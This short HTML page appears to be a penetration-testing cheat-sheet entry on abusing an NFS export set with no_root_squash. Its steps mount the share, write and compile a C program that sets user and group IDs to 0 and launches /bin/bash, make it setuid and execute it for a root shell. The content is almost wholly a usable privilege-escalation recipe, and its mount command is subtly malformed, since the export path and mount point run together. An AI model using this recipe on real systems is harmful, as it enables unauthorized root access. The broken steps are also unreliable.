<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>no_root_squash</title>
</head><body>Example if: <br/>
no_root_squash option is defined for "/tmp"<br/>
<br/>
mkdir /tmp/1<br/>
mount -o rw,vers=2 &lt;IP&gt;:/tmp/tmp/1<br/>
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' &gt; /tmp/1/x.c<br/>
gcc /tmp/1/x.c -o /tmp/1/x<br/>
chmod +s /tmp/1/x<br/>
/tmp/1/./x<br/>
</body></html>
